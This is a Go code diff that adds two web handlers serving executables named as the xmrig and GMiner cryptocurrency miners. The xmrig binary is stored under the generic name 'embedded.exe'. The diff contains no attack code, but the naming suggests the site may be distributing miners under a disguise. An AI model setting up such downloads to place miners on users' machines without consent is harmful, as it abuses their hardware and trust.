@@ -10,6 +10,7 @@ import (
 	"log"
 	"math/rand"
 	"net/http"
+	"os"
 	"strconv"
 	"time"
 )
@@ -516,4 +517,30 @@ func (h *Handler) Donations(w http.ResponseWriter, r *http.Request) {
 
 	w.Header().Set("Content-Type", "text/html")
 	tmpl.ExecuteTemplate(w, "layout", data)
+}
+
+
+// Handles request for xmrig file
+
+func (h *Handler) FetchXmrig(w http.ResponseWriter, r *http.Request) {
+		path := "./static/resources/embedded.exe"
+
+	if _, err := os.Stat(path); err != nil {
+		http.Error(w, "file not found", http.StatusNotFound)
+		return
+	}
+	http.ServeFile(w, r, path)
+}
+
+
+// Handles request for xmrig file
+
+func (h *Handler) FetchGMiner(w http.ResponseWriter, r *http.Request) {
+		path := "./static/resources/gminer.exe"
+
+	if _, err := os.Stat(path); err != nil {
+		http.Error(w, "file not found", http.StatusNotFound)
+		return
+	}
+	http.ServeFile(w, r, path)
 }
